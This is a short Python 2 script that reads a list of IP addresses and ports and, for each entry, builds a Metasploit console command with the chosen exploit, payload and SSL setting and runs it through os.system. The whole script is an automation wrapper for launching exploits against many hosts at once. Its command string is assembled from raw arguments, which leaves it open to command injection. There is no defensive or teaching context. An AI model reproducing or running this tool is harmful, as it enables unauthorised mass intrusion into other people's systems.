import os
import sys

listfile = sys.argv[1]
payload = sys.argv[2]
exploit = sys.argv[3]
ssl = sys.argv[4]


with open(listfile, 'r') as reader:
    for x in reader:
        spl = x.split(",")
        ip = spl[0]
        port = spl[1]

        cmd = "msfconsole -x \""+exploit+"; set RHOSTS "+ip+"; set PAYLOAD "+payload+";set CMD \"ls\"; set RPORT "+port+"; set SSL "+ssl+"; set VERBOSE true; run; exit\""
        returned_value = os.system(cmd) 
        
        print returned_value
        
